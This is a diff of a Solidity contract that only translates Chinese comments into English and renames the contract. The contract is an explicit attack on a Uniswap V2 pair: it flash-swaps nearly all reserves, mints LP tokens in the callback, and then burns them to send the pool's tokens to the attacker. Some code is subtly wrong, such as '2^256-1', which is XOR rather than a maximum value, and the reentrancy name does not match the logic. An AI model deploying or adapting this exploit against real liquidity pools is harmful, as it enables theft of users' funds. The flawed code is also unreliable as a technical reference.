@@ -1,75 +1,75 @@
 pragma solidity ^0.8.0;
 
-import {IUniswapV2Pair} from "../contracts/core/interfaces/IUniswapV2Pair.sol"; // 导入Uniswap V2交易对接口
-import {IERC20} from "../contracts/core/interfaces/IERC20.sol"; // 导入ERC20标准接口
+import {IUniswapV2Pair} from "../contracts/core/interfaces/IUniswapV2Pair.sol"; // Import Uniswap V2 pair interface
+import {IERC20} from "../contracts/core/interfaces/IERC20.sol"; // Import ERC20 standard interface
 
-contract ExploitUniswapV2{
-    IUniswapV2Pair uniswapV2Pair; // Uniswap V2交易对
-    IERC20 weth; // 代表WETH代币的ERC20接口
-    IERC20 token; // 另一种代币的ERC20接口
-    IERC20 LPToken; // Uniswap V2交易对的流动性代币
-    address public attacker; // 攻击者的地址
-    address public uniswapV2PairAddress; // Uniswap V2交易对的地址
-    address public wethAddress; // WETH代币的地址
-    address public tokenAddress; // 另一种代币的地址
+contract AttackForReentrancy{
+    IUniswapV2Pair uniswapV2Pair; // Uniswap V2 pair
+    IERC20 weth; // ERC20 interface representing WETH
+    IERC20 token; // ERC20 interface for another token
+    IERC20 LPToken; // Liquidity token of the Uniswap V2 pair
+    address public attacker; // Attacker's address
+    address public uniswapV2PairAddress; // Address of the Uniswap V2 pair
+    address public wethAddress; // Address of the WETH token
+    address public tokenAddress; // Address of the other token
 
     constructor(address _uniswapV2Pair,address _weth,address _token) {
-        weth=IERC20(_weth); // 初始化WETH代币接口
-        token=IERC20(_token); // 初始化另一种代币接口
-        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair); // 初始化Uniswap V2交易对
-        uniswapV2PairAddress=_uniswapV2Pair; // 设置Uniswap V2交易对地址
-        wethAddress=_weth; // 设置WETH代币地址
-        tokenAddress=_token; // 设置另一种代币地址
-        LPToken=IERC20(_uniswapV2Pair); // 初始化Uniswap V2交易对的流动性代币接口
-        attacker = msg.sender; // 设置攻击者地址为创建合约的地址
-        weth.approve(attacker,2^256-1); // 批准攻击者无限额转账WETH
-        token.approve(attacker,2^256-1); // 批准攻击者无限额转账另一种代币
-        weth.approve(uniswapV2PairAddress,2^256-1); // 批准Uniswap V2交易对无限额转账WETH
-        token.approve(uniswapV2PairAddress,2^256-1); // 批准Uniswap V2交易对无限额转账另一种代币
+        weth=IERC20(_weth); // Initialize WETH token interface
+        token=IERC20(_token); // Initialize other token interface
+        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair); // Initialize Uniswap V2 pair
+        uniswapV2PairAddress=_uniswapV2Pair; // Set Uniswap V2 pair address
+        wethAddress=_weth; // Set WETH token address
+        tokenAddress=_token; // Set other token address 
+        LPToken=IERC20(_uniswapV2Pair); // Initialize liquidity token interface of Uniswap V2 pair
+        attacker = msg.sender; // Set attacker address to contract creator
+        weth.approve(attacker,2^256-1); // Approve attacker for unlimited WETH transfer
+        token.approve(attacker,2^256-1); // Approve attacker for unlimited transfer of other token
+        weth.approve(uniswapV2PairAddress,2^256-1); // Approve Uniswap V2 pair for unlimited WETH transfer
+        token.approve(uniswapV2PairAddress,2^256-1); // Approve Uniswap V2 pair for unlimited transfer of other token
     }
 
-    function exploit() public payable { // 用以进行利用的公开方法，需要发送一些ETH
-        require(msg.sender == attacker, "Not an attacker"); // 仅攻击者可以调用
-        payable(wethAddress).call{value:address(this).balance}(abi.encodeWithSignature("deposit()", "")); // 调用WETH合约的deposit方法将ETH转为WETH
-        uniswapV2Pair.sync(); // 同步Uniswap V2交易对的储备金
-        (uint reserve0,uint reserve1,uint blocktimestamp)=uniswapV2Pair.getReserves(); // 获取Uniswap V2交易对的储备金和时间戳
-        uniswapV2Pair.swap(reserve0-1, reserve1-1, address(this), "attack"); // 在Uniswap V2交易对中进行交易
+    function exploit() public payable { // Public method for exploitation, needs to send some ETH
+        require(msg.sender == attacker, "Not an attacker"); // Only attacker can call
+        payable(wethAddress).call{value:address(this).balance}(abi.encodeWithSignature("deposit()", "")); // Call WETH deposit to wrap ETH to WETH
+        uniswapV2Pair.sync(); // Sync reserves of Uniswap V2 pair
+        (uint reserve0,uint reserve1,uint blocktimestamp)=uniswapV2Pair.getReserves(); // Get reserves and timestamp of Uniswap V2 pair
+        uniswapV2Pair.swap(reserve0-1, reserve1-1, address(this), "attack"); // Trade on Uniswap V2 pair
     }
 
-    //攻击思路为，用闪电贷拿来的钱来mint LP Token，获取大量的LP，且闪电贷的钱同时也还了，然后移除流动性，获取池子中更多的代币
+    // Attack idea is to mint LP with flash loaned funds, get large amount of LP, repay loan, then remove liquidity to drain more tokens from the pool
     function uniswapV2Call(
         address, /* sender */
         uint amount0,
         uint amount1,
         bytes calldata /* data */
-    ) external { // Uniswap V2交易对的回调方法
-        address token0InPair=uniswapV2Pair.token0(); // 获取Uniswap V2交易对中的第一个代币
-        require(msg.sender == uniswapV2PairAddress); // 调用者必须是Uniswap V2交易对
-        uniswapV2Pair.sync(); // 同步Uniswap V2交易对的储备金
-        if(token0InPair==wethAddress){ // 如果第一个代币是WETH
-            weth.transfer(uniswapV2PairAddress, amount0); // 返还WETH
-            token.transfer(uniswapV2PairAddress, amount1); // 返还另一种代币
+    ) external { // Callback of Uniswap V2 pair
+        address token0InPair=uniswapV2Pair.token0(); // Get first token in Uniswap V2 pair
+        require(msg.sender == uniswapV2PairAddress); // Caller must be Uniswap V2 pair
+        uniswapV2Pair.sync(); // Sync reserves of Uniswap V2 pair
+        if(token0InPair==wethAddress){ // If first token is WETH
+            weth.transfer(uniswapV2PairAddress, amount0); // Return WETH
+            token.transfer(uniswapV2PairAddress, amount1); // Return other token
         }
-        else{ // 否则
-            weth.transfer(uniswapV2PairAddress, amount1); // 返还WETH
-            token.transfer(uniswapV2PairAddress, amount0); // 返还另一种代币
+        else{ // Otherwise 
+            weth.transfer(uniswapV2PairAddress, amount1); // Return WETH
+            token.transfer(uniswapV2PairAddress, amount0); // Return other token
         }
         
-        uniswapV2Pair.mint(address(this)); // 生成新的流动性代币
+        uniswapV2Pair.mint(address(this)); // Mint new liquidity tokens
         
-        if(token0InPair==wethAddress){ // 如果第一个代币是WETH
-            weth.transfer(uniswapV2PairAddress, amount0/10); // 返还更多的WETH
+        if(token0InPair==wethAddress){ // If first token is WETH
+            weth.transfer(uniswapV2PairAddress, amount0/10); // Return more WETH
         }
-        else{ // 否则
-            weth.transfer(uniswapV2PairAddress, amount1/10); // 返还更多的WETH
+        else{ // Otherwise
+            weth.transfer(uniswapV2PairAddress, amount1/10); // Return more WETH
         }
     }
 
-    function withdraw() public{ // 攻击结束后用以提取资金的公开方法
-        require(msg.sender==attacker); // 仅攻击者可以调用
-        LPToken.transfer(uniswapV2PairAddress,LPToken.balanceOf(address(this))); // 转移所有流动性代币到Uniswap V2交易对
-        uniswapV2Pair.burn(address(this)); // 销毁流动性代币
-        weth.transfer(attacker,weth.balanceOf(address(this))); // 提取所有WETH到攻击者地址
-        token.transfer(attacker,token.balanceOf(address(this))); // 提取所有另一种代币到攻击者地址
+    function withdraw() public{ // Public method to withdraw funds after attack
+        require(msg.sender==attacker); // Only attacker can call
+        LPToken.transfer(uniswapV2PairAddress,LPToken.balanceOf(address(this))); // Transfer all liquidity tokens to Uniswap V2 pair
+        uniswapV2Pair.burn(address(this)); // Burn liquidity tokens
+        weth.transfer(attacker,weth.balanceOf(address(this))); // Transfer all WETH to attacker
+        token.transfer(attacker,token.balanceOf(address(this))); // Transfer all other tokens to attacker
     }
 }
